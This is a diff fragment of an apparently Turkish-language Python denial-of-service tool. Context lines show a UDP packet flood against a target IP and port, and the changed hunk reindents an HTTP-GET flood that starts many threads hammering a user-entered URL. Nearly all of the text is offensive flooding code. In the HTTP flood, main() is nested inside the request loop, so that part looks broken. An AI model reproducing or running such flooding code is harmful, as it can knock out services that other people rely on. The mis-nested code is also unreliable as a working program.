@@ -306,22 +306,22 @@ if(dil == "1"):
           sock.sendto(bytes, (hedef_ip, hedef_port))
           sayac += 1
           print("\033[92mHUCUM EDILIR , gonderilen byte:::%s\033[0m" % (sayac))
-      elif(dos == "2"):
-       import requests
-       import threading
-       def ddos(target):
-        while True:
-         try:
-             requests.get(target)
-         except:
-             pass
-         def main():
-          target = input('Enter target URL: ')
-          thread_count = int(input('Enter number of threads: '))
-          for _ in range(thread_count):
-           threading.Thread(target=ddos, args=(target,)).start()
-          if __name__ == '__main__':
-           main()
+     if(dos == "2"):
+      import requests
+      import threading
+      def ddos(target):
+       while True:
+        try:
+            requests.get(target)
+        except:
+            pass
+        def main():
+         target = input('Enter target URL: ')
+         thread_count = int(input('Enter number of threads: '))
+         for _ in range(thread_count):
+          threading.Thread(target=ddos, args=(target,)).start()
+         if __name__ == '__main__':
+          main()
            
 
  elif secim == '4':
